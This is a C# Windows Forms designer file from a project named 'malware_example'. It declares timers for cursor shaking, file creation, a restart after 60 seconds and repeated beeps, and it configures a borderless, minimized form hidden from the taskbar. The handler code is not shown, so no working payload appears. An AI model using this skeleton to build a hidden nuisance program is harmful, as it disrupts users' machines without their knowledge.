namespace malware_example
{
    partial class Form1
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            this.cursorShake = new System.Windows.Forms.Timer(this.components);
            this.createfiletimer = new System.Windows.Forms.Timer(this.components);
            this.timeUntilRestart = new System.Windows.Forms.Timer(this.components);
            this.beep1 = new System.Windows.Forms.Timer(this.components);
            this.beep2 = new System.Windows.Forms.Timer(this.components);
            this.SuspendLayout();
            // 
            // cursorShake
            // 
            this.cursorShake.Interval = 10;
            this.cursorShake.Tick += new System.EventHandler(this.cursorShake_Tick);
            // 
            // createfiletimer
            // 
            this.createfiletimer.Tick += new System.EventHandler(this.createfiletimer_Tick);
            // 
            // timeUntilRestart
            // 
            this.timeUntilRestart.Interval = 60000;
            this.timeUntilRestart.Tick += new System.EventHandler(this.timeUntilRestart_Tick);
            // 
            // beep1
            // 
            this.beep1.Interval = 1534;
            this.beep1.Tick += new System.EventHandler(this.beep1_Tick);
            // 
            // beep2
            // 
            this.beep2.Interval = 3234;
            this.beep2.Tick += new System.EventHandler(this.beep2_Tick);
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(581, 324);
            this.ControlBox = false;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "Form1";
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "malware-example";
            this.WindowState = System.Windows.Forms.FormWindowState.Minimized;
            this.Load += new System.EventHandler(this.Form1_Load);
            this.ResumeLayout(false);

        }

        #endregion

        private System.Windows.Forms.Timer cursorShake;
        private System.Windows.Forms.Timer createfiletimer;
        private System.Windows.Forms.Timer timeUntilRestart;
        private System.Windows.Forms.Timer beep1;
        private System.Windows.Forms.Timer beep2;
    }
}

